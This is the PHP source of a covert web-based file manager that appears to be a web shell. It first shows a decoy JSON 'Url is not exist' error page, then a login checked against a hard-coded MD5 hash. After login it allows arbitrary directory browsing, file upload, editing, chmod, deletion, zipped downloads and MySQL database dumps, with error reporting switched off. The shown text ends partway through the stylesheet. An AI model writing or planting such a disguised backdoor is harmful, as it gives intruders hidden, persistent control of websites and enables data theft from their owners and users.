<?php
session_start();

// Enable error logging for debugging
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(E_ALL);

$stored_hash = 'f1b708bba17f1ce948dc979f4d7092bc'; // md5 of your password

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Step 1: Show JSON on first load
if (!isset($_SESSION['json_shown']) && !isset($_SESSION['access_granted'])) {
    $_SESSION['json_shown'] = true;

    header('Content-Type: text/html');
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>URL Error</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" rel="stylesheet">
        <style>
            body {
                background-color: #1a2226;
                color: #e9ecef;
                font-family: 'Roboto', sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .json-error {
                background: #2c3e50;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 4px 20px rgba(0,0,0,0.3);
                font-size: 16px;
                font-family: 'Courier New', monospace;
                color: #ff6b6b;
                max-width: 600px;
                width: 100%;
                text-align: center;
            }
        </style>
    </head>
    <body>
        <div class="json-error">
            {"code":11,"msg":"Url is not exist","msgCode":5,"ServiceNowTime":"<?php echo date('Y-m-d H:i:s'); ?>"}
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Step 2: Handle password input
if (!isset($_SESSION['access_granted'])) {
    $error = null;

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (md5($_POST['password']) === $stored_hash) {
            $_SESSION['access_granted'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Incorrect password!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" rel="stylesheet">
        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
        <style>
            body {
                margin: 0;
                background: linear-gradient(135deg, #1a2226 0%, #2c3e50 100%);
                color: #e9ecef;
                font-family: 'Roboto', sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .login-container {
                background: #2c3e50;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 4px 20px rgba(0,0,0,0.3);
                width: 100%;
                max-width: 450px;
            }
            input[type="password"] {
                border: 1px solid #4b5e6d;
                background: #34495e;
                color: #e9ecef;
                font-size: 16px;
                padding: 12px;
                border-radius: 6px;
                outline: none;
                width: 100%;
            }
            input[type="password"]::placeholder {
                color: #a0b1c0;
            }
            .btn-login {
                background: #3498db;
                color: #fff;
                font-weight: 500;
                padding: 12px;
                border-radius: 6px;
                width: 100%;
                transition: background 0.3s ease;
            }
            .btn-login:hover {
                background: #2980b9;
            }
            .error {
                color: #ff6b6b;
                margin-bottom: 20px;
                text-align: center;
                font-size: 14px;
            }
            h3 {
                color: #e9ecef;
                text-align: center;
                margin-bottom: 25px;
                font-weight: 500;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h3><i class="fas fa-lock me-2"></i> Secure Login</h3>
            <?php if ($error): ?>
                <div class="error"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            <form id="loginForm" method="post">
                <input type="password" name="password" id="password" autocomplete="off" placeholder="Enter password" required>
                <button type="submit" class="btn-login mt-3">Login</button>
            </form>
        </div>

        <script>
            document.getElementById("password").focus();
            document.getElementById("password").addEventListener("keypress", function(e) {
                if (e.key === "Enter") {
                    e.preventDefault();
                    document.getElementById("loginForm").submit();
                }
            });
        </script>
    </body>
    </html>
    <?php
    exit;
}

// Step 3: File Manager Logic
@set_time_limit(0);
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '512M');
date_default_timezone_set('Asia/Kolkata');

$root_dir = getcwd();
$trash_dir = $root_dir . DIRECTORY_SEPARATOR . '.trash';
if (!is_dir($trash_dir)) {
    mkdir($trash_dir, 0755);
}

$cwd = realpath($_GET['dir'] ?? $root_dir);
$cwd = is_dir($cwd) ? $cwd : $root_dir;
$action = $_POST['action'] ?? $_GET['action'] ?? '';
$msg = isset($_SESSION['msg']) ? $_SESSION['msg'] : '';

// Clear session message after displaying
unset($_SESSION['msg']);

// Clear search results if navigating, clearing, or empty search
if (isset($_GET['clear_search']) || (isset($_POST['search_query']) && empty(trim($_POST['search_query']))) || (isset($_GET['dir']) && realpath($_GET['dir']) !== realpath($cwd))) {
    unset($_SESSION['search_results']);
    unset($_SESSION['search_query']);
}

// Debug directory contents
error_log("Current Directory: $cwd");
error_log("Items: " . print_r(getSortedItems($cwd), true));

// Search Function (limited to current directory and subfolders)
if ($action == 'search' && isset($_POST['search_query'])) {
    $search_query = trim($_POST['search_query']);
    if (empty($search_query)) {
        unset($_SESSION['search_results']);
        unset($_SESSION['search_query']);
    } else {
        function searchFiles($dir, $query) {
            $results = [];
            $items = scandir($dir);
            if ($items === false) {
                error_log("Failed to read directory in search: $dir");
                return $results;
            }
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                $path = $dir . DIRECTORY_SEPARATOR . $item;
                if (stripos($item, $query) !== false) {
                    $results[] = [
                        'name' => $item,
                        'path' => $path,
                        'is_dir' => is_dir($path),
                        'size' => is_file($path) ? filesize($path) : '-',
                        'modified' => date("Y-m-d H:i:s", filemtime($path)),
                        'permissions' => substr(sprintf('%o', fileperms($path)), -4)
                    ];
                }
                if (is_dir($path)) {
                    $sub_results = searchFiles($path, $query);
                    $results = array_merge($results, $sub_results);
                }
            }
            return $results;
        }
        $search_results = searchFiles($cwd, $search_query);
        $_SESSION['search_results'] = $search_results;
        $_SESSION['search_query'] = $search_query;
        $_SESSION['msg'] = "Search completed for '$search_query'.";
    }
    header("Location: ?dir=" . urlencode($cwd));
    exit;
}

// Sort files and folders
function getSortedItems($dir) {
    if (!is_dir($dir) || !is_readable($dir)) {
        error_log("Cannot access directory: $dir");
        return [];
    }
    $items = scandir($dir);
    if ($items === false) {
        error_log("Failed to read directory: $dir");
        return [];
    }
    $folders = [];
    $files = [];
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
    sort($folders);
    sort($files);
    return array_merge($folders, $files);
}

// Create New File
if ($action == 'create_file' && isset($_POST['filename'])) {
    $filename = trim($_POST['filename']);
    $target = $cwd . DIRECTORY_SEPARATOR . $filename;
    if (!file_exists($target)) {
        file_put_contents($target, '');
        $_SESSION['msg'] = "File '$filename' created successfully.";
    } else {
        $_SESSION['msg'] = "File '$filename' already exists.";
    }
    header("Location: ?dir=" . urlencode($cwd));
    exit;
}

// Create New Folder
if ($action == 'create_folder' && isset($_POST['foldername'])) {
    $foldername = trim($_POST['foldername']);
    $target = $cwd . DIRECTORY_SEPARATOR . $foldername;
    if (!file_exists($target)) {
        mkdir($target, 0755);
        $_SESSION['msg'] = "Folder '$foldername' created successfully.";
    } else {
        $_SESSION['msg'] = "Folder '$foldername' already exists.";
    }
    header("Location: ?dir=" . urlencode($cwd));
    exit;
}

// Rename
if ($action == 'rename' && isset($_POST['selected'], $_POST['new'])) {
    $old = $cwd . DIRECTORY_SEPARATOR . $_POST['selected'][0];
    $new = $cwd . DIRECTORY_SEPARATOR . $_POST['new'];
    if (file_exists($old)) {
        rename($old, $new);
        $_SESSION['msg'] = "Renamed successfully.";
    } else {
        $_SESSION['msg'] = "File or folder not found.";
    }
    header("Location: ?dir=" . urlencode($cwd));
    exit;
}

// Delete
if ($action == 'delete' && isset($_POST['selected'])) {
    foreach ($_POST['selected'] as $item) {
        $target = $cwd . DIRECTORY_SEPARATOR . $item;
        if (file_exists($target)) {
            if (realpath($cwd) === realpath($trash_dir)) {
                function deleteRecursive($path) {
                    if (is_file($path)) {
                        unlink($path);
                    } else {
                        $items = scandir($path);
                        foreach ($items as $item) {
                            if ($item === '.' || $item === '..') continue;
                            deleteRecursive($path . DIRECTORY_SEPARATOR . $item);
                        }
                        rmdir($path);
                    }
                }
                deleteRecursive($target);
                $_SESSION['msg'] = "Deleted permanently.";
            } else {
                $trash_target = $trash_dir . DIRECTORY_SEPARATOR . basename($target) . '_' . time();
                rename($target, $trash_target);
                $_SESSION['msg'] = "Moved to trash successfully.";
            }
        }
    }
    header("Location: ?dir=" . urlencode($cwd));
    exit;
}

// Upload
if ($action == 'upload' && isset($_FILES['file'])) {
    $msg = '';
    for ($i = 0; $i < count($_FILES['file']['name']); $i++) {
        $target = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['file']['name'][$i]);
        move_uploaded_file($_FILES['file']['tmp_name'][$i], $target);
        $msg .= "File '{$_FILES['file']['name'][$i]}' uploaded successfully. ";
    }
    $_SESSION['msg'] = trim($msg);
    header("Location: ?dir=" . urlencode($cwd));
    exit;
}

// SQL Dump
if ($action == 'sqldump' && isset($_POST['host'], $_POST['user'], $_POST['pass'], $_POST['db'])) {
    $host = $_POST['host'];
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $db   = $_POST['db'];

    $conn = new mysqli($host, $user, $pass, $db);
    if ($conn->connect_error) {
        $_SESSION['msg'] = "Connection failed: " . $conn->connect_error;
    } else {
        $dump = "-- SQL Dump for $db\n";
        $dump .= "-- Generated on " . date('Y-m-d H:i:s') . "\n\n";
        $dump .= "SET FOREIGN_KEY_CHECKS=0;\n\n";

        $tables = $conn->query("SHOW TABLES");
        while ($row = $tables->fetch_row()) {
            $table = $row[0];
            $create = $conn->query("SHOW CREATE TABLE `$table`")->fetch_row()[1];
            $dump .= "DROP TABLE IF EXISTS `$table`;\n";
            $dump .= $create . ";\n\n";

            $rows = $conn->query("SELECT * FROM `$table`");
            while ($r = $rows->fetch_assoc()) {
                $cols = array_map(function($v) use ($conn) {
                    return "'" . $conn->real_escape_string($v) . "'";
                }, array_values($r));
                $dump .= "INSERT INTO `$table` VALUES (" . implode(",", $cols) . ");\n";
            }
            $dump .= "\n";
        }

        $dump .= "SET FOREIGN_KEY_CHECKS=1;\n";
        $dumpFile = $cwd . DIRECTORY_SEPARATOR . $db . '_' . date('Ymd_His') . '.sql';
        file_put_contents($dumpFile, $dump);
        $_SESSION['msg'] = "SQL Dump created: " . basename($dumpFile);
        $conn->close();
    }
    header("Location: ?dir=" . urlencode($cwd));
    exit;
}

// Preview
if ($action == 'preview' && isset($_GET['file'])) {
    $target = $cwd . DIRECTORY_SEPARATOR . $_GET['file'];
    if (is_file($target)) {
        header('Content-Type: text/plain');
        readfile($target);
        exit;
    }
}

// Preview Image
if ($action == 'preview_image' && isset($_GET['file'])) {
    $target = $cwd . DIRECTORY_SEPARATOR . $_GET['file'];
    if (is_file($target)) {
        $mime = mime_content_type($target);
        header('Content-Type: ' . $mime);
        readfile($target);
        exit;
    }
}

// Download
if ($action == 'download' && isset($_POST['selected'])) {
    if (count($_POST['selected']) == 1) {
        $target = $cwd . DIRECTORY_SEPARATOR . $_POST['selected'][0];
        if (is_file($target)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($target) . '"');
            readfile($target);
            exit;
        }
    } else {
        $zipFile = $cwd . DIRECTORY_SEPARATOR . 'download_' . date('Ymd_His') . '.zip';
        $zip = new ZipArchive();
        if ($zip->open($zipFile, ZipArchive::CREATE) === TRUE) {
            foreach ($_POST['selected'] as $item) {
                $itemPath = realpath($cwd . DIRECTORY_SEPARATOR . $item);
                if ($itemPath !== false && strpos($itemPath, $cwd) === 0) {
                    if (is_file($itemPath)) {
                        $zip->addFile($itemPath, $item);
                    } elseif (is_dir($itemPath)) {
                        $files = new RecursiveIteratorIterator(
                            new RecursiveDirectoryIterator($itemPath),
                            RecursiveIteratorIterator::LEAVES_ONLY
                        );
                        foreach ($files as $file) {
                            if (!$file->isDir()) {
                                $filePath = $file->getRealPath();
                                $relativePath = $item . substr($filePath, strlen($itemPath));
                                $zip->addFile($filePath, $relativePath);
                            }
                        }
                    }
                }
            }
            $zip->close();
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($zipFile) . '"');
            readfile($zipFile);
            unlink($zipFile);
            exit;
        } else {
            $_SESSION['msg'] = "Failed to create zip for download.";
            header("Location: ?dir=" . urlencode($cwd));
            exit;
        }
    }
}

// Compress
if ($action == 'compress' && isset($_POST['selected'])) {
    foreach ($_POST['selected'] as $item) {
        $itemPath = realpath($cwd . DIRECTORY_SEPARATOR . $item);
        $zipFile = $cwd . DIRECTORY_SEPARATOR . $item . '_' . date('Ymd_His') . '.zip';
        $zip = new ZipArchive();
        if ($zip->open($zipFile, ZipArchive::CREATE) === TRUE) {
            if (is_file($itemPath)) {
                $zip->addFile($itemPath, $item);
            } elseif (is_dir($itemPath)) {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($itemPath),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
                foreach ($files as $file) {
                    if (!$file->isDir()) {
                        $filePath = $file->getRealPath();
                        $relativePath = $item . substr($filePath, strlen($itemPath));
                        $zip->addFile($filePath, $relativePath);
                    }
                }
            }
            $zip->close();
            $_SESSION['msg'] = "Zip created: " . basename($zipFile);
        } else {
            $_SESSION['msg'] = "Failed to create zip.";
        }
    }
    header("Location: ?dir=" . urlencode($cwd));
    exit;
}

// Extract
if ($action == 'extract' && isset($_POST['selected'])) {
    foreach ($_POST['selected'] as $item) {
        $itemPath = $cwd . DIRECTORY_SEPARATOR . $item;
        if (is_file($itemPath) && pathinfo($itemPath, PATHINFO_EXTENSION) === 'zip') {
            $zip = new ZipArchive();
            if ($zip->open($itemPath) === TRUE) {
                $extractPath = $cwd . DIRECTORY_SEPARATOR . pathinfo($item, PATHINFO_FILENAME);
                if (!is_dir($extractPath)) {
                    mkdir($extractPath, 0755, true);
                }
                $zip->extractTo($extractPath);
                $zip->close();
                $_SESSION['msg'] = "Extracted $item successfully.";
            } else {
                $_SESSION['msg'] = "Failed to extract $item.";
            }
        }
    }
    header("Location: ?dir=" . urlencode($cwd));
    exit;
}

// Copy
if ($action == 'copy' && isset($_POST['selected'], $_POST['destination'])) {
    $destination = realpath($cwd . DIRECTORY_SEPARATOR . $_POST['destination']);
    if ($destination && strpos($destination, $root_dir) === 0 && is_dir($destination)) {
        foreach ($_POST['selected'] as $item) {
            $source = $cwd . DIRECTORY_SEPARATOR . $item;
            $target = $destination . DIRECTORY_SEPARATOR . $item;
            if (is_file($source)) {
                copy($source, $target);
            } elseif (is_dir($source)) {
                function copyRecursive($source, $dest) {
                    if (!is_dir($dest)) mkdir($dest, 0755, true);
                    $items = scandir($source);
                    foreach ($items as $item) {
                        if ($item === '.' || $item === '..') continue;
                        $srcPath = $source . DIRECTORY_SEPARATOR . $item;
                        $destPath = $dest . DIRECTORY_SEPARATOR . $item;
                        if (is_file($srcPath)) {
                            copy($srcPath, $destPath);
                        } elseif (is_dir($srcPath)) {
                            copyRecursive($srcPath, $destPath);
                        }
                    }
                }
                copyRecursive($source, $target);
            }
            $_SESSION['msg'] = "Copied $item to " . basename($destination) . ".";
        }
    } else {
        $_SESSION['msg'] = "Invalid destination directory.";
    }
    header("Location: ?dir=" . urlencode($cwd));
    exit;
}

// Move
if ($action == 'move' && isset($_POST['selected'], $_POST['destination'])) {
    $destination = realpath($cwd . DIRECTORY_SEPARATOR . $_POST['destination']);
    if ($destination && strpos($destination, $root_dir) === 0 && is_dir($destination)) {
        foreach ($_POST['selected'] as $item) {
            $source = $cwd . DIRECTORY_SEPARATOR . $item;
            $target = $destination . DIRECTORY_SEPARATOR . $item;
            if (file_exists($source)) {
                rename($source, $target);
                $_SESSION['msg'] = "Moved $item to " . basename($destination) . ".";
            }
        }
    } else {
        $_SESSION['msg'] = "Invalid destination directory.";
    }
    header("Location: ?dir=" . urlencode($cwd));
    exit;
}

// Change Permissions
if ($action == 'chmod' && isset($_POST['selected'], $_POST['permissions'])) {
    $permissions = octdec($_POST['permissions']);
    foreach ($_POST['selected'] as $item) {
        $target = $cwd . DIRECTORY_SEPARATOR . $item;
        if (file_exists($target)) {
            chmod($target, $permissions);
            $_SESSION['msg'] = "Permissions updated for $item.";
        }
    }
    header("Location: ?dir=" . urlencode($cwd));
    exit;
}

// Save Edit
if ($action == 'saveedit' && isset($_POST['filename'], $_POST['content'])) {
    $editFile = $cwd . DIRECTORY_SEPARATOR . $_POST['filename'];
    file_put_contents($editFile, $_POST['content']);
    $_SESSION['msg'] = "File saved successfully.";
    header("Location: ?dir=" . urlencode($cwd));
    exit;
}

// Edit Form
if ($action == 'edit' && isset($_GET['file'])) {
    $target = $cwd . DIRECTORY_SEPARATOR . $_GET['file'];
    if (is_file($target)) {
        $content = htmlspecialchars(file_get_contents($target));
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Edit File - <?= htmlspecialchars(basename($target)) ?></title>
            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
            <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" rel="stylesheet">
            <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
            <style>
                body {
                    background: #f8f9fa;
                    font-family: 'Roboto', sans-serif;
                    color: #2c3e50;
                    margin: 0;
                }
                .editor-container {
                    max-width: 1200px;
                    margin: 20px auto;
                    padding: 15px;
                    background: #fff;
                    border-radius: 8px;
                    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
                }
                .editor-header {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    padding-bottom: 10px;
                    border-bottom: 1px solid #dee2e6;
                }
                .editor-header h4 {
                    font-size: 18px;
                    font-weight: 500;
                    margin: 0;
                }
                .editor-toolbar {
                    display: flex;
                    gap: 10px;
                    margin-bottom: 15px;
                }
                textarea {
                    background: #fff;
                    color: #2c3e50;
                    border: 1px solid #4b5e6d;
                    font-family: 'Courier New', monospace;
                    font-size: 14px;
                    border-radius: 6px;
                    resize: vertical;
                    padding: 15px;
                    width: 100%;
                    min-height: 400px;
                }
                .btn-success, .btn-secondary, .btn-info {
                    font-weight: 500;
                    padding: 8px 15px;
                    border-radius: 6px;
                    transition: background 0.3s ease;
                }
                .btn-success:hover { background: #27ae60; }
                .btn-secondary:hover { background: #7f8c8d; }
                .btn-info:hover { background: #16a085; }
                .modal-content {
                    background: #2c3e50;
                    color: #e9ecef;
                    border-radius: 8px;
                }
                .modal-header, .modal-footer {
                    border-color: #4b5e6d;
                }
                .modal-title {
                    font-size: 16px;
                }
                .modal-body input {
                    font-size: 12px;
                }
                @media (max-width: 576px) {
                    .editor-container {
                        padding: 10px;
                    }
                    textarea {
                        font-size: 12px;
                    }
                    .editor-header h4 {
                        font-size: 16px;
                    }
                    .btn-success, .btn-secondary, .btn-info {
                        padding: 6px 12px;
                        font-size: 14px;
                    }
                }
            </style>
        </head>
        <body>
            <div class="editor-container">
                <div class="editor-header">
                    <h4><i class="fas fa-file-code me-2"></i> Editing: <?= htmlspecialchars(basename($target)) ?></h4>
                    <a href="?dir=<?= urlencode($cwd) ?>" class="btn btn-secondary"><i class="fas fa-arrow-left me-2"></i> Back</a>
                </div>
                <div class="editor-toolbar">
                    <button type="button" class="btn btn-info" data-bs-toggle="modal" data-bs-target="#findModal"><i class="fas fa-search me-2"></i> Find</button>
                    <button type="button" class="btn btn-info" data-bs-toggle="modal" data-bs-target="#replaceModal"><i class="fas fa-exchange-alt me-2"></i> Replace</button>
                    <button type="button" class="btn btn-info" onclick="formatCode()"><i class="fas fa-align-left me-2"></i> Format</button>
                </div>
                <form method="post">
                    <input type="hidden" name="action" value="saveedit">
                    <input type="hidden" name="filename" value="<?= htmlspecialchars($_GET['file']) ?>">
                    <textarea name="content" id="editor" rows="20" class="form-control mb-3"><?= $content ?></textarea>
                    <button type="submit" class="btn btn-success"><i class="fas fa-save me-2"></i> Save</button>
                </form>
            </div>

            <!-- Find Modal -->
            <div class="modal fade" id="findModal" tabindex="-1" aria-labelledby="findModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title" id="findModalLabel">Find</h5>
                            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body">
                            <div class="mb-3">
                                <label for="findInput" class="form-label">Find Text</label>
                                <input type="text" id="findInput" class="form-control" placeholder="Enter text to find">
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                            <button type="button" class="btn btn-primary" onclick="findText()">Find</button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Replace Modal -->
            <div class="modal fade" id="replaceModal" tabindex="-1" aria-labelledby="replaceModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title" id="replaceModalLabel">Replace</h5>
                            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body">
                            <div class="mb-3">
                                <label for="replaceFindInput" class="form-label">Find</label>
                                <input type="text" id="replaceFindInput" class="form-control" placeholder="Enter text to find">
                            </div>
                            <div class="mb-3">
                                <label for="replaceInput" class="form-label">Replace With</label>
                                <input type="text" id="replaceInput" class="form-control" placeholder="Enter replacement text">
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                            <button type="button" class="btn btn-primary" onclick="replaceText()">Replace</button>
                        </div>
                    </div>
                </div>
            </div>

            <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
            <script>
                function findText() {
                    const find = document.getElementById('findInput').value;
                    if (find) {
                        const textarea = document.getElementById('editor');
                        textarea.focus();
                        const text = textarea.value;
                        const start = text.indexOf(find);
                        if (start !== -1) {
                            textarea.setSelectionRange(start, start + find.length);
                        } else {
                            alert('Text not found.');
                        }
                    }
                    bootstrap.Modal.getInstance(document.getElementById('findModal')).hide();
                }

                function replaceText() {
                    const find = document.getElementById('replaceFindInput').value;
                    const replace = document.getElementById('replaceInput').value;
                    if (find) {
                        const textarea = document.getElementById('editor');
                        textarea.value = textarea.value.replace(new RegExp(find, 'g'), replace);
                    }
                    bootstrap.Modal.getInstance(document.getElementById('replaceModal')).hide();
                }

                function formatCode() {
                    alert('Formatting not implemented. Use an external tool for advanced formatting.');
                }
            </script>
        </body>
        </html>
        <?php
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            background: #ecf0f1;
            font-family: 'Roboto', sans-serif;
            color: #2c3e50;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
        }
        .container-fluid {
            padding: 10px;
        }
        .header {
            background: #2c3e50;
            padding: 8px 10px;
            border-radius: 6px;
            margin-bottom: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .logo {
            color: #e9ecef;
            font-size: 18px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .toolbar {
            display: flex;
            align-items: center;
            gap: 5px;
            position: relative;
        }
        .toolbar .btn {
            padding: 5px;
            transition: transform 0.2s ease;
        }
        .toolbar .dropdown-menu {
            background: #2c3e50;
            border: none;
            border-radius: 6px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
            min-width: 180px;
        }
        .toolbar .dropdown-item {
            color: #e9ecef;
            padding: 8px 12px;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .toolbar .dropdown-item:hover {
            background: #3498db;
            color: #fff;
        }
        .sidebar {
            background: #2c3e50;
            color: #e9ecef;
            padding: 10px;
            border-radius: 6px;
            height: 100vh;
            position: fixed;
            top: 0;
            left: -200px;
            width: 200px;
            z-index: 1000;
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
            transition: left 0.3s ease, opacity 0.3s ease;
            display: flex;
            flex-direction: column;
            gap: 8px;
            opacity: 0;
        }
        .sidebar.active {
            left: 0;
            opacity: 1;
        }
        .sidebar h5 {
            font-size: 14px;
            margin: 8px 0;
            padding-left: 8px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .sidebar .nav-link {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px;
            border-radius: 4px;
            transition: background 0.2s ease;
            font-size: 12px;
        }
        .sidebar .nav-link:hover {
            background: #34495e;
        }
        .sidebar form {
            margin: 8px;
        }
        .sidebar .input-group {
            margin-bottom: 8px;
        }
        .sidebar .input-group input {
            font-size: 12px;
            padding: 6px;
        }
        .sidebar .input-group button {
            padding: 6px;
        }
        .sidebar hr {
            border-color: #4b5e6d;
            margin: 8px 0;
        }
        .sidebar .collapse {
            padding-left: 15px;
            transition: all 0.3s ease;
            opacity: 1;
            display: none;
        }
        .sidebar .collapse.show {
            display: block;
        }
        .content {
            background: #fff;
            padding: 15px;
            border-radius: 6px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            margin-left: 0;
            transition: margin-left 0.3s ease;
        }
        .content.active {
            margin-left: 200px;
        }
        .menu-toggle {
            display: none;
            font-size: 18px;
            color: #e9ecef;
            background: none;
            border: none;
            cursor: pointer;
        }
        .table {
            background: #fff;
            color: #2c3e50;
            border-radius: 6px;
            overflow: hidden;
        }
        .table.grid-view {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
            gap: 10px;
            padding: 10px;
        }
        .table.grid-view thead {
            display: none;
        }
        .table.grid-view tbody tr {
            display: flex;
            flex-direction: column;
            align-items: center;
            border: 1px solid #dee2e6;
            border-radius: 6px;
            padding: 10px;
            text-align: center;
        }
        .table.grid-view tbody tr td {
            border: none;
            padding: 5px;
        }
        .table.grid-view tbody tr td:first-child {
            display: none;
        }
        .table thead {
            background: #3498db;
            color: #fff;
        }
        .table tbody tr {
            position: relative;
        }
        .table tbody tr:hover {
            background: #f5f6fa;
            cursor: pointer;
        }
        .table tbody tr.selected::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(52, 152, 219, 0.3);
            pointer-events: none;
        }
        .table .file-icon {
            font-size: 18px;
            color: #3498db;
        }
        .table.grid-view .file-icon {
            font-size: 24px;
        }
        .table .file-icon.selected {
            color: #27ae60;
        }
        .btn-sm {
            font-size: 0.8rem;
            padding: 5px 10px;
            font-weight: 500;
            border-radius: 6px;
        }
        .btn-primary, .btn-success, .btn-danger, .btn-warning, .btn-info, .btn-secondary {
            font-weight: 500;
            padding: 6px 10px;
            border-radius: 6px;
            transition: background 0.3s ease, transform 0.2s ease;
        }
        .btn-primary:hover { background: #2980b9; transform: translateY(-2px); }
        .btn-success:hover { background: #27ae60; transform: translateY(-2px); }
        .btn-danger:hover { background: #c0392b; transform: translateY(-2px); }
        .btn-warning:hover { background: #e67e22; transform: translateY(-2px); }
        .btn-info:hover { background: #16a085; transform: translateY(-2px); }
        .btn-secondary:hover { background: #7f8c8d; transform: translateY(-2px); }
        .input-group input, .input-group select {
            border: 1px solid #4b5e6d;
            font-size: 12px;
            border-radius: 6px;
            background: #fff;
            color: #2c3e50;
        }
        .input-group input::placeholder {
            color: #7f8c8d;
        }
        .alert-success, .alert-info {
            background: #dff0d8;
            color: #27ae60;
            font-weight: 500;
            border-radius: 6px;
            padding: 8px;
            font-size: 14px;
        }
        .alert-info {
            background: #d1ecf1;
            color: #0c5460;
        }
        .form-control:focus {
            border-color: #3498db;
            box-shadow: 0 0 6px rgba(52,152,219,0.3);
        }
        h3, h5 {
            color: #2c3e50;
            font-weight: 500;
            font-size: 14px;
            margin-bottom: 8px;
        }
        .current-dir {
            background: #e9ecef;
            padding: 8px;
            border-radius: 6px;
            margin-bottom: 10px;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        .current-dir a {
            padding: 4px 8px;
            font-size: 12px;
            color: #3498db;
            text-decoration: none;
        }
        .current-dir a:hover {
            text-decoration: underline;
        }
        .current-dir span {
            word-break: break-all;
            max-width: calc(100% - 80px);
        }
        .action-icon {
            margin-right: 6px;
        }
        .nav-link {
            color: #3498db;
            font-weight: 500;
            transition: color 0.3s ease;
        }
        .nav-link:hover {
            color: #e9ecef;
        }
        .context-menu {
            position: absolute;
            background: #2c3e50;
            color: #e9ecef;
            border-radius: 6px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
